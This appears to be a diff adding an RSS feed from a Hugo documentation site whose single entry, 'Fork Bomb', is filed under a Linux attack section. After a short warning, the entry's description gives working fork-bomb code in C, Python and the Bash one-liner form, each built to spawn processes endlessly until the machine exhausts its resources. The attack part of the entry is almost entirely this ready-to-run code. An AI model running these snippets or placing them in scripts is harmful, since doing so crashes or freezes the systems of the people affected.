@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Linux on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/linux/</link>
+    <description>Recent content in Linux on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:32:48 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Fork Bomb</title>
+      <link>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/linux/attack/fork-bomb/</guid>
+      <description>Warning linkPlease don’t execute the following programs in system that you don’t want to harm.&#xA;Exploitation in C linkThis program forks child processes continuously.&#xA;#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; int main() { while (1) // Create a child process from the parent process. fork(); return 0; } Exploitation in Python link import os while True: os.fork() Exploitation in Bash link :(){ :|: &amp;amp; };: </description>
+    </item>
+  </channel>
+</rss>
